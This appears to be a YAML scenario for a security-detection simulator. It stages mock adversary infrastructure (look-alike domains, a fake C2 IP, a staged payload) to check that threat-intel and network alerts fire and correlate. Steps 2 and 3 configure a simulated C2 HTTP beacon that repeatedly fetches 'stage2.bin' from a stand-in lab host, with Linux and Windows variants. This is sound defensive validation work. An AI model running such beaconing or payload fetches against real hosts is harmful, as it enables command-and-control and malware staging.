scenario_id: SIM-TIM-002
name: "TIM — Adversary Resource-Development Infrastructure Staging Detection"
version: "1.0"
status: active

plane: TIM
detection_types:
  - IOC
  - XQL
  - BIOC
  - Correlation

uc_ref: UCS-TIM-02
tc_ref: TC-TIM-02
uc_name: "Threat Intel Management — Resource-Development Detection"
tc_name: "Adversary Infrastructure Staging Surfaced From Threat-Intel Feeds"

mitre_tactic: "TA0042"
mitre_tactic_name: "Resource Development"
mitre_technique: "T1583.001"
mitre_technique_name: "Acquire Infrastructure: Domains"
additional_techniques:
  - technique: "T1608.001"
    name: "Stage Capabilities: Upload Malware"
  - technique: "T1585"
    name: "Establish Accounts"

threat_report: "Unit42 - Newly Registered Domains: Malicious Abuse by Bad Actors"
threat_report_url: "https://unit42.paloaltonetworks.com/newly-registered-domains-malicious-abuse-by-bad-actors/"

execution_identity:
  default: container-runtime
  options:
    - container-runtime
    - root

push_supported: true
pull_supported: true

required_content:
  - repo: "PaloAltoNetworks/mocktaxii"

infra_modules_needed:
  - base
  - tim
  - ndr

external_tools:
  - name: cortexsim-eal-cli
    source: "https://github.com/hankthebldr/cortex-pov-engine"
    type: script
    install_inline: false

# ── Causality contract ──────────────────────────────────────────────────────
# Defender-vantage TIM scenario: the estate host's outbound-reaching process is
# the EAL beacon/loader harness (python3), NOT the cortexsim beacon node — that
# is the Causality Group Owner XDR/NGFW would attribute the DNS resolution +
# staged-payload fetch to. The steps run in one operator session on one host:
# feed pre-flight → dry-run safety gate → live resolve+fetch, each sharing the
# same estate host (shared_entity on src_host, the scenario's stitching_key). The
# feed-match / DNS / NGFW-session legs then stitch on that host into one
# Resource-Development incident (CR-TIM-0002, correlation_window_seconds: 300).
cgo_anchor:
  image_name: "python3"
  primary_username: "container-runtime"

steps:
  - id: step-01
    name: "Confirm mocktaxii Resource-Development indicators (look-alike domains, staged-payload hash, C2 IP) are ingested"
    command: |
      curl -sf "http://localhost:9000/taxii2/" -H 'Accept: application/taxii+json;version=2.1' | jq -e '.api_roots | length >= 1'
      python3 -m scripts.eal_simulator.cli list-plugins | jq -e '.total >= 4'
    identity: container-runtime
    mitre_technique: "T1583.001"
    expected_detections:
      - plane: TIM
        type: XQL
        description: "Pre-flight: the mocktaxii Resource-Development indicator set (domain/ipv4/sha256) is ingested into the XSIAM threat_intel dataset"
        ttp_ref: "TTP-2026-0079"
        detection_id: xql-tim-002-pre-flight-resource-development-indicators-ingested-into-threat-intel
    platforms: ["linux", "container"]

  - id: step-02
    name: "Dry-run staging fetch — confirm safety policy holds before generating IOC traffic"
    command: |
      TIM_ZONE="${TIM_ZONE:-cortexsim-tim.internal}"
      cat > /tmp/tim-resdev-stage-dry.yml <<YML
      campaign_id: CMP-TIM-002
      name: "TIM validation — adversary infrastructure staging dry run"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: false
      target_allowlist: []
      dry_run: true
      tags: [tim, resource-development, look-alike-domain, staged-payload, eal]
      steps:
        - step_id: step-01
          plugin: c2_http_beacon
          params:
            target_url: http://payload-delivery.${TIM_ZONE}:8000/stage2.bin
            iterations: 3
            sleep_seconds: 5
            jitter_pct: 10
      YML
      python3 -m scripts.eal_simulator.cli run /tmp/tim-resdev-stage-dry.yml
    identity: container-runtime
    mitre_technique: "T1583.001"
    expected_detections:
      - plane: TIM
        type: XQL
        description: "Dry-run: no Resource-Development IOC match fires (safety policy active, no live resolution/fetch)"
        ttp_ref: "TTP-2026-0079"
        detection_id: xql-tim-002-newly-registered-look-alike-domain-resolution-surfaced-ndr-dns-leg
    causality:
      parent_step: step-01
      pivot: shared_entity
    platforms: ["linux", "container"]

  - id: step-03
    name: "Live resolve + fetch from TAXII-fed staged-capability host — fire IOC match + DNS leg + session + stitch"
    command: |
      TIM_ZONE="${TIM_ZONE:-cortexsim-tim.internal}"
      cat > /tmp/tim-resdev-stage-live.yml <<YML
      campaign_id: CMP-TIM-002
      name: "TIM validation — adversary infrastructure staging live fetch"
      authorized_by: "domain-consultant@paloaltonetworks.com"
      simulation_authorized: true
      target_allowlist:
        - payload-delivery.${TIM_ZONE}
        - dga-1a2b3c.${TIM_ZONE}
      dry_run: false
      tags: [tim, resource-development, look-alike-domain, staged-payload, eal]
      steps:
        - step_id: step-01
          plugin: c2_http_beacon
          params:
            target_url: http://payload-delivery.${TIM_ZONE}:8000/stage2.bin
            iterations: 3
            sleep_seconds: 5
            jitter_pct: 10
            method: GET
            dga_query_param: false
      YML
      python3 -m scripts.eal_simulator.cli run /tmp/tim-resdev-stage-live.yml --live
    identity: container-runtime
    mitre_technique: "T1583.001"
    expected_detections:
      - plane: TIM
        type: IOC
        description: "TIM IOC match — staged-capability host matches the planted payload-delivery indicator from the mocktaxii TAXII feed"
        ttp_ref: "TTP-2026-0079"
        detection_id: ioc-domain-payload-delivery-cortexsim-tim-internal
      - plane: TIM
        type: IOC
        description: "TIM IOC match — DGA-style newly-registered look-alike subdomain matches the planted indicator from the mocktaxii feed"
        ttp_ref: "TTP-2026-0079"
        detection_id: ioc-domain-dga-1a2b3c-cortexsim-tim-internal
      - plane: TIM
        type: IOC
        description: "TIM IOC match — provisioned fake-C2 IP the staged look-alike subdomains resolve to (adversary infrastructure)"
        ttp_ref: "TTP-2026-0079"
        detection_id: ioc-ipv4-198-51-100-66
      - plane: TIM
        type: XQL
        description: "TIM IOC match — outbound fetch of the staged payload from a TAXII-fed staged-capability host (join threat_intel to NGFW session)"
        ttp_ref: "TTP-2026-0079"
        detection_id: xql-tim-002-ioc-match-outbound-fetch-from-taxii-fed-staged-capability-host
      - plane: NDR
        type: XQL
        description: "NDR DNS leg — resolution of a newly-registered look-alike / staged subdomain surfaced"
        ttp_ref: "TTP-2026-0079"
        detection_id: xql-tim-002-newly-registered-look-alike-domain-resolution-surfaced-ndr-dns-leg
      - plane: NDR
        type: BIOC
        description: "NGFW/DNS EAL — resolution of a TAXII-fed look-alike domain armed by TIM as a Resource-Development indicator"
        ttp_ref: "TTP-2026-0079"
        detection_id: bioc-tim-002-resolution-of-newly-registered-look-alike-domain-from-adversary-infrastructure-feed
      - plane: ANALYTICS
        type: Correlation
        description: "Stitch — Resource-Development feed match joined to the DNS resolution + NDR session on src_host within 300s into one incident"
        ttp_ref: "TTP-2026-0079"
        detection_id: CR-TIM-0002
      - plane: ANALYTICS
        type: XQL
        description: "Stitch validation — Resource-Development feed match joined to resolution and session on source host"
        ttp_ref: "TTP-2026-0079"
        detection_id: xql-tim-002-stitch-resource-development-feed-match-joined-to-resolution-and-session-on-source-host
    causality:
      parent_step: step-02
      pivot: shared_entity
    platforms: ["linux", "container", "windows"]
    platform_variants:
      windows: |
        $env:TIM_ZONE = 'cortexsim-tim.internal'
        @'
        campaign_id: CMP-TIM-002
        name: "TIM validation — adversary infrastructure staging live fetch"
        authorized_by: "domain-consultant@paloaltonetworks.com"
        simulation_authorized: true
        target_allowlist:
          - payload-delivery.cortexsim-tim.internal
          - dga-1a2b3c.cortexsim-tim.internal
        dry_run: false
        steps:
          - step_id: step-01
            plugin: c2_http_beacon
            params:
              target_url: http://payload-delivery.cortexsim-tim.internal:8000/stage2.bin
              iterations: 3
              sleep_seconds: 5
              jitter_pct: 10
              method: GET
              dga_query_param: false
        '@ | Set-Content -Encoding utf8 $env:TEMP\tim-resdev-stage-live.yml
        python -m scripts.eal_simulator.cli run $env:TEMP\tim-resdev-stage-live.yml --live

cleanup:
  commands:
    - "rm -f /tmp/tim-resdev-stage-dry.yml /tmp/tim-resdev-stage-live.yml /tmp/stage2.bin"
    - "echo '[CortexSim] SIM-TIM-002 cleanup complete'"

author: "Henry Reed"
created: "2026-06-15"
last_updated: "2026-06-15"
tags:
  - tim
  - threat-intel
  - taxii
  - resource-development
  - look-alike-domain
  - newly-registered-domain
  - staged-payload
  - eal

validation_methodology: "IOC Feed Match + Causality Graph Stitching"
methodology_family: "F8"
primary_kpi: "Detection Accuracy"
threshold:
  kpi: "Detection Accuracy"
  op: "≥"
  value: 90
  unit: "%"
success_criteria: |
  The subscribed mocktaxii TAXII feed ingests the Resource-Development indicator
  set (newly-registered look-alike domains, staged-payload SHA-256, provisioned
  C2 IP). A lab host resolving and fetching from the staged-capability host
  raises a TIM IOC match before any payload runs, and the feed-match stitches
  with the DNS resolution and NGFW session on src_host into one Resource-
  Development incident within 300s.
moat_tier: "LEAD"
correlation_window_seconds: 300
required_planes_in_incident:
  - TIM
  - NDR
stitching_key: src_host
